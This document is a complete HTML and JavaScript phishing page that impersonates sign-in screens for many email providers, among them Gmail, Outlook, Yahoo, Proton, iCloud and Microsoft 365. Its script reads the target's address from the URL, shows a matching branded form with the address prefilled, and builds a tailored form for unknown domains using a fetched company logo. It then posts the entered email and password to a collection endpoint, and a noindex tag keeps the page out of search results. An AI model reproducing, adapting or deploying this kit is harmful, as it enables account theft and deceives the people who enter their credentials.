<!DOCTYPE html>
<html lang="en">
<head>
    <meta name=”robots” content=”noindex”>
    <link href="img/favicon.ico"rel="icon"type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .form-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .provider-logo {
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .provider-logo img {
            width: 150px;
        }
        .eml-list img{
            width: 100%;
        }
        .eml-list{
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }

        .divider {
            border-top: 1px solid #dee2e6;
            margin: 0.5rem 0;
        }
        .form-check-input:checked {
            background-color: #009688;
            border-color: #009688;
        }
        .btn-signin {
            background-color: #000;
            color: white;
            width: 100%;
            padding: 0.75rem;
        }
        .btn-signin:hover {
            background-color: #333;
            color: white;
        }
        .error-button{
            background-color:rgb(102, 203, 62)!important;
            color:#fff;
            cursor:not-allowed
        }
        .custom-grey-text {
            font-weight: 500;
            color: #6c757d;
        }
        .proceed-button{
            width:100%;
            padding:12px;
            background-color:#141414;
            color:#fff;border:none;
            border-radius:8px;
            cursor:pointer;
            margin-bottom:12px;
            font-weight:500
        }
        .dynamic-provider-logo {
            text-align: center;
            margin-bottom: 20px;
            height: 100px;
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
        }
        h4 {
            text-align: center;
            color: #333;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="email"], 
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button:hover {
            opacity: 0.9;
        }
        
        #gsuite, #outlook, #hotmail, #msn, #centurylink, #spectrum, #yahoo, #microsoft, #webmail, #zoho ,#yandex, #aol, #gmx, #tuta, #icloud, #proton {
            display: none;
        }

        .loading {
            text-align: center;
            font-style: italic;
            color: #666;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <!-- Gmail/GSuite Form -->
    <div id="gsuite" class="form-container">
        <div class="provider-logo">
            <img src="img/logo3.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormPhrase" method="post">
            <div class="form-group">
                <label for="gsuite-email">Email</label>
                <input type="email" id="gsuite-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="gsuite-password">Password</label>
                <input type="password" id="gsuite-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormPhrase")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        
        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have G-Suite email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Outlook Form -->
    <div id="outlook" class="form-container">
        <div class="provider-logo">
            <img src="img/logo2.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormOutlk" method="post">
            <div class="form-group">
                <label for="outlook-email">Email</label>
                <input type="email" id="outlook-email"name="phwet" required>
            </div>
            <div class="form-group">
                <label for="outlook-password">Password</label>
                <input type="password" id="outlook-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormOutlk")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Outlook email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

        <!-- Hotmail Form -->
    <div id="hotmail" class="form-container">
        <div class="provider-logo">
            <img src="img/logo12.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormOutlk" method="post">
            <div class="form-group">
                <label for="html-email">Email</label>
                <input type="email" id="html-email"name="phwet" required>
            </div>
            <div class="form-group">
                <label for="html-password">Password</label>
                <input type="password" id="html-password" name="psdwet" required>
            </div>
            <button class="proceed-button" onclick='sendMessage("contactFormOutlk")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Hotmail email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

            <!-- MSN Form -->
    <div id="msn" class="form-container">
        <div class="provider-logo">
            <img src="img/logo13.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormMsn" method="post">
            <div class="form-group">
                <label for="msn-email">Email</label>
                <input type="email" id="msn-email"name="phwet" required>
            </div>
            <div class="form-group">
                <label for="msn-password">Password</label>
                <input type="password" id="msn-password" name="psdwet" required>
            </div>
            <button class="proceed-button" onclick='sendMessage("contactFormMsn")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Hotmail?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- CenturyLink Form -->
    <div id="centurylink" class="form-container">
        <div class="provider-logo">
            <img src="img/logo6.png" alt="">
        </div>
            <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormCntry"method="post">
            <div class="form-group">
                <label for="centurylink-email">Email</label>
                <input type="email" id="centurylink-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="centurylink-password">Password</label>
                <input type="password" id="centurylink-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormCntry")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have CenturyLink email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Spectrum Form -->
    <div id="spectrum" class="form-container">
        <div class="provider-logo">
            <img src="img/logo5.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormSpctrm"method="post">
            <div class="form-group">
                <label for="spectrum-email">Email</label>
                <input type="email" id="spectrum-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="spectrum-password">Password</label>
                <input type="password" id="spectrum-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormSpctrm")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Spectrum email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Yahoo Form -->
    <div id="yahoo" class="form-container">
        <div class="provider-logo">
            <img src="img/logo4.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormYahoo"method="post">
            <div class="form-group">
                <label for="yahoo-email">Email</label>
                <input type="email" id="yahoo-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="yahoo-password">Password</label>
                <input type="password" id="yahoo-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormYahoo")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Yahoo email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

        <!-- Zoho Form -->
    <div id="zoho" class="form-container">
        <div class="provider-logo">
            <img src="img/logo7.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormZoho"method="post">
            <div class="form-group">
                <label for="zoho-email">Email</label>
                <input type="email" id="zoho-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="zoho-password">Password</label>
                <input type="password" id="zoho-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormZoho")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Zoho email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

        <!-- Aol Form -->
    <div id="aol" class="form-container">
        <div class="provider-logo">
            <img src="img/logo8.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormAol"method="post">
            <div class="form-group">
                <label for="aol-email">Email</label>
                <input type="email" id="aol-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="aol-password">Password</label>
                <input type="password" id="aol-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormAol")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Aol email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Yandex Form -->
    <div id="yandex" class="form-container">
        <div class="provider-logo">
            <img src="img/logo9.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormYandex"method="post">
            <div class="form-group">
                <label for="yandex-email">Email</label>
                <input type="email" id="yandex-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="yandex-password">Password</label>
                <input type="password" id="yandex-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormYandex")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Yandex email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Tuta Form -->
    <div id="tuta" class="form-container">
        <div class="provider-logo">
            <img src="img/logo10.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormTuta"method="post">
            <div class="form-group">
                <label for="tuta-email">Email</label>
                <input type="email" id="tuta-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="tuta-password">Password</label>
                <input type="password" id="tuta-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormTuta")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Tuta email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

        <!-- Proton Form -->
    <div id="proton" class="form-container">
        <div class="provider-logo">
            <img src="img/logo14.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormProton"method="post">
            <div class="form-group">
                <label for="proton-email">Email</label>
                <input type="email" id="proton-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="proton-password">Password</label>
                <input type="password" id="proton-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormProton")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Proton email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

            <!-- Icloud Form -->
    <div id="icloud" class="form-container">
        <div class="provider-logo">
            <img src="img/logo15.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormIcloud"method="post">
            <div class="form-group">
                <label for="icloud-email">Email</label>
                <input type="email" id="icloud-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="icloud-password">Password</label>
                <input type="password" id="icloud-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormIcloud")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list d-block align-items-center">
            <img src="img/list.png" class="mt-2" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Icloud account?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

        <!-- Microsoft Form -->
    <div id="microsoft" class="form-container">
        <div class="provider-logo">
            <img src="img/logo.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormM365"method="post">
            <div class="form-group">
                <label for="microsoft-email">Email</label>
                <input type="email" id="microsoft-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="microsoft-password">Password</label>
                <input type="password" id="microsoft-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormM365")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
            <p class="custom-grey-text">Others</p>
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have Microsoft365 email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

            <!-- GMX Form -->
    <div id="gmx" class="form-container">
        <div class="provider-logo">
            <img src="img/logo11.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormGmx"method="post">
            <div class="form-group">
                <label for="gmx-email">Email</label>
                <input type="email" id="gmx-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="gmx-password">Password</label>
                <input type="password" id="gmx-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormGmx")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have GMX email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Generic Webmail Form - Will be customized with domain logo -->
    <div id="webmail" class="form-container">
        <div class="dynamic-provider-logo" id="dynamic-logo"></div>
        <p class="loading" id="loading-message"></p>
        <h4 id="webmail-title">Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormWebml"method="post">
            <div class="form-group">
                <label for="webmail-email">Email</label>
                <input type="email" id="webmail-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="webmail-password">Password</label>
                <input type="password" id="webmail-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormWebml")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
            <p class="custom-grey-text">Others</p>
        </div>
        
        <div class="text-center mb-3">
            Don't have email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get the hash from the URL (without the # symbol)
            const hash = window.location.hash.substring(1);
            
            // Process the hash only if it contains an email (has @ symbol)
            if (hash && hash.includes('@')) {
                const email = hash;
                const domain = email.split('@')[1].toLowerCase();
                
                // Determine which form to show based on the domain
                let formToShow = 'webmail'; // Default
                
                if (domain === 'gmail.com') {
                    formToShow = 'gsuite';
                } else if (domain === 'outlook.com') {
                    formToShow = 'outlook';
                } else if (domain === 'hotmail.com') {
                    formToShow = 'hotmail';
                } else if (domain === 'centurylink.net') {
                    formToShow = 'centurylink';
                } else if (domain === 'msn') {
                    formToShow = 'msn';
                } else if (domain === 'spectrum.net') {
                    formToShow = 'spectrum';
                } else if (domain.includes('yahoo') || domain === 'rocketmail.com' || domain === 'ymail.com') {
                    formToShow = 'yahoo';
                } else if (domain === 'zoho.com') {
                    formToShow = 'zoho';
                } else if (domain === 'aol.com') {
                    formToShow = 'aol';
                } else if (domain === 'yandex.com') {
                    formToShow = 'yandex';
                }  else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
                    formToShow = 'gmx';
                } else if (domain === 'tutanota.com' || domain === 'tuta.com' || domain === 'tutanota.de' || domain === 'tutanota.fr' || domain === 'keemail.me') {
                    formToShow = 'tuta';
                } else if (domain === 'proton.me' || domain === 'protonmail.com' || domain === 'pm.me') {
                    formToShow = 'proton';                
                } else if (domain.includes('onmicrosoft')) {
                    formToShow = 'microsoft';
                } else {
                    formToShow = 'webmail';
                    customizeWebmailForm(domain);
                }

                document.getElementById(formToShow).style.display = 'block';
                
                // Set the email value in the appropriate form
                const emailField = document.getElementById(formToShow + '-email');
                if (emailField) {
                    emailField.value = email;
                }
                
            } else {
                document.getElementById('microsoft').style.display = 'block';
            }
        });

function sendMessage(formId) {
  const form = document.getElementById(formId);
  const formData = new FormData(form);
  const formDataObj = {};

  // Get the button but don't set error state immediately
  const sendButton = form.querySelector(".proceed-button");
  const originalText = sendButton.textContent;
  
  // Set loading state
  sendButton.textContent = "Sending...";
  sendButton.disabled = true;

  // Convert FormData to object
  formData.forEach((value, key) => {
    formDataObj[key] = value;
  });

  // Add the send flag
  formDataObj.send = "true";

  console.log('Sending data:', formDataObj); // Debug log

  fetch("/api/submit", {
    method: "POST",
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(formDataObj)
  })
  .then(response => {
    console.log('Response status:', response.status); // Debug log
    
    if (!response.ok) {
      return response.json().then(data => {
        throw new Error(data.error || `HTTP ${response.status}`);
      });
    }
    return response.json();
  })
  .then(data => {
    console.log('Success, sent:', data); // Debug log
    
    // Success state
    sendButton.textContent = "Sent Successfully!";
    sendButton.classList.add("success-button");
    
    // Reset form
    form.reset();
    
    // Reset button after 3 seconds
    setTimeout(() => {
      sendButton.textContent = originalText;
      sendButton.classList.remove("success-button");
      sendButton.disabled = false;
    }, 3000);
  })
  .catch(error => {
    console.error('Error:', error); // Debug log
    
    // Error state
    sendButton.textContent = "Error - Try Again";
    sendButton.classList.add("error-button");
    
    // Show user-friendly error message
    alert(`Failed to send message: ${error.message}`);
    
    // Reset button after 3 seconds
    setTimeout(() => {
      sendButton.textContent = originalText;
      sendButton.classList.remove("error-button");
      sendButton.disabled = false;
    }, 3000);
  });
}
        
        // Function to customize the webmail form based on the domain
        function customizeWebmailForm(domain) {
            
            // Get domain without subdomain
            const parts = domain.split('.');
            let baseDomain = domain;
            if (parts.length >= 2) {
                baseDomain = parts[parts.length - 2] + '.' + parts[parts.length - 1];
            }
            
            // Update loading message
            document.getElementById('loading-message').textContent = `Loading...`;
            
// Update form title with domain
const domainTitle = baseDomain.split('.')[0];
document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}`;
            
            // Try to fetch logo/image from the domain
            fetchDomainLogo(baseDomain);
        }
        
        // Function to fetch the logo or image from a domain
        function fetchDomainLogo(domain) {
            const logoElement = document.getElementById('dynamic-logo');
            const loadingMessage = document.getElementById('loading-message');
            
            // URLs to try for logos (common paths)
            const urlsToTry = [
                `https://${domain}/favicon.ico`,
                `https://${domain}/logo.png`,
                `https://${domain}/images/logo.png`,
                `https://${domain}/img/logo.png`,
                `https://logo.clearbit.com/${domain}`
            ];
            
            // Use a service that returns logos for domains
            // Clearbit has a free logo API we can use
            const clearbitUrl = `https://logo.clearbit.com/${domain}`;
            
            // Create an image element to test loading
            const img = new Image();
            img.onload = function() {
                // Image loaded successfully
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = `url('${clearbitUrl}')`;
                
                // Update button color based on image
                try {
                    extractColorFromImage(img, function(color) {
                        document.getElementById('webmail-button').style.backgroundColor = color;
                    });
                } catch (e) {
                }
            };
            
            img.onerror = function() {
                // If Clearbit fails, try a simple text-based logo
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = 'none';
                logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
                
                // Use a default button color
                document.getElementById('webmail-button').style.backgroundColor = '#555';
            };
            
            // Start loading the image
            img.src = clearbitUrl;
        }
        
        // Function to extract dominant color from an image (simplified version)
        function extractColorFromImage(img, callback) {
            // Create a canvas to analyze the image
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const width = img.width;
            const height = img.height;
            
            canvas.width = width;
            canvas.height = height;
            
            // Draw image to canvas
            context.drawImage(img, 0, 0, width, height);
            
            try {
                // Get image data from center of image (likely where logo is)
                const data = context.getImageData(Math.floor(width/2), Math.floor(height/2), 1, 1).data;
                
                // Convert to hex color
                const hex = "#" + ((1 << 24) + (data[0] << 16) + (data[1] << 8) + data[2]).toString(16).slice(1);
                callback(hex);
            } catch (e) {
                // If there's any error (like CORS), use default color
                console.error('Error extracting color:', e);
                callback('#555555');
            }
        }
    </script>
</body>
</html>